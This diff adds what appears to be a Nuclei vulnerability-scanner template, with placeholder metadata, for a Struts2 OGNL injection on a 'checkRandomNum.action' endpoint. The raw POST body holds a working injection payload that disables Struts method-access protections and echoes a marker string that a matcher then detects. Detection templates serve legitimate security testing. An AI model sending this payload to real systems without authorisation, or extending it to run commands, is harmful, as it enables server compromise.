@@ -1,0 +1,27 @@
+id: ciyitong-stuts-rce-2
+info:
+  name: Template Name
+  author: wangzong
+  severity: critical
+  description: description
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /system/rand!checkRandomNum.action HTTP/1.1
+        Cookie: SessionId=96F3F15432E0660E0654B1CE240C4C36
+        User-Agent: Java/1.8.0_212
+        Host: {{Hostname}}
+        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+        Content-type: application/x-www-form-urlencoded
+        Content-Length: 444
+        Connection: close
+
+        class.classLoader.jarPath=%28%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d%3d+new+java.lang.Boolean%28false%29%2c+%23_memberAccess%5b%22allowStaticMethodAccess%22%5d%3dtrue%2c%23outstr%3d@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2c%23outstr.print%28%22webpath%22%29%2c%23outstr.println%28%22888888%22%29%2c%23outstr.close%28%29%29%28meh%29&z%5b%28class.classLoader.jarPath%29%28%27meh%27%29%5d=
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '888888'
